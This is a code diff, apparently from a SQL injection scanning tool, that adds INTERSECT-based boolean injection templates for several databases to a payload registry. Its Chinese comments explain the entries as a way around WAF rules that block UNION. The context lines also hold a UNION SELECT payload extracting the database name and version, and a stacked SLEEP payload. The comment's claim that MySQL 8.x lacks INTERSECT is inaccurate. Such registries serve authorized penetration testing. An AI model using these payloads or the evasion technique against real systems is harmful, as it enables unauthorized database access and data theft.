@@ -117,6 +117,21 @@ export const PAYLOAD_REGISTRY = [
   { id: 'mysql-union-2', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'union', level: 2, risk: 1, clause: ['where'], boundary: ["')"], template: "{ORIG}') UNION SELECT {NUM},database(),version()-- -", where: 'value' },
   { id: 'mysql-stacked-1', dbms: ['MySQL', 'MariaDB', 'TiDB'], technique: 'stacked', level: 3, risk: 2, clause: ['where'], boundary: [';'], template: '{ORIG}; SELECT SLEEP({SLEEP}) {SEP}', where: 'value' },
 
+  // ==================== 集合运算探针（[D.1 补全 2026-09-12] INTERSECT/EXCEPT 通道） ====================
+  // 实战价值：WAF 常以关键字 `UNION` 做拦截正则，`INTERSECT/EXCEPT/MINUS` 集合运算不在同一
+  // 特征族内——`{ORIG} INTERSECT SELECT 1-- -`（真：合法、结果集不变 ≈ 基线）与
+  // `{ORIG} EXCEPT SELECT 1-- -`（假：EXCEPT 空集在等值查询下仍 ≈ 基线，故改用「真=1 行、
+  // 假=0 行」的谓词形态）。真假对统一用「INTERSECT 保留行数差异」构造：
+  //   真：{ORIG} INTERSECT SELECT {ORIG}     → 右侧含原值 → 保留原行 ≈ 基线
+  //   假：{ORIG} INTERSECT SELECT {ORIG}+1   → 右侧无原值 → 空集 ≠ 基线（数值型）
+  // 需要目标列数兼容（SELECT 单列标量与原查询首列同型），故 level=4、where='value'，
+  // 仅深度扫描时作为 UNION 被关键字拦截后的替代探测通道。MySQL 8.x 不支持 INTERSECT/EXCEPT
+  // （仅 UNION），故不设 MySQL 条目；MariaDB 10.3+/PG/SQLite/MSSQL/Oracle 支持。
+  { id: 'pg-bool-setops-1', dbms: ['PostgreSQL'], technique: 'boolean', level: 4, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} INTERSECT SELECT {ORIG}-- -', falseTemplate: '{ORIG} INTERSECT SELECT {ORIG}+1-- -', where: 'value' },
+  { id: 'mssql-bool-setops-1', dbms: ['SQL Server'], technique: 'boolean', level: 4, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} INTERSECT SELECT {ORIG}', falseTemplate: '{ORIG} INTERSECT SELECT {ORIG}+1', where: 'value' },
+  { id: 'sqlite-bool-setops-1', dbms: ['SQLite'], technique: 'boolean', level: 4, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} INTERSECT SELECT {ORIG}-- -', falseTemplate: '{ORIG} INTERSECT SELECT {ORIG}+1-- -', where: 'value' },
+  { id: 'maria-bool-setops-1', dbms: ['MariaDB'], technique: 'boolean', level: 4, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} INTERSECT SELECT {ORIG}', falseTemplate: '{ORIG} INTERSECT SELECT {ORIG}+1', where: 'value', minVersion: { major: 10, minor: 3 } },
+  { id: 'ora-bool-setops-1', dbms: ['Oracle'], technique: 'boolean', level: 4, risk: 1, clause: ['where'], boundary: [''], template: '{ORIG} INTERSECT SELECT {ORIG} FROM DUAL', falseTemplate: '{ORIG} INTERSECT SELECT {ORIG}+1 FROM DUAL', where: 'value' },
   // ==================== PostgreSQL ====================
   { id: 'pg-bool-sq-1', dbms: ['PostgreSQL'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: ["'"], template: "{ORIG}' AND '1'='1", falseTemplate: "{ORIG}' AND '1'='2", where: 'value' },
   { id: 'pg-bool-dq-1', dbms: ['PostgreSQL'], technique: 'boolean', level: 1, risk: 1, clause: ['where'], boundary: ['"'], template: '{ORIG}" AND "1"="1', falseTemplate: '{ORIG}" AND "1"="2', where: 'value' },
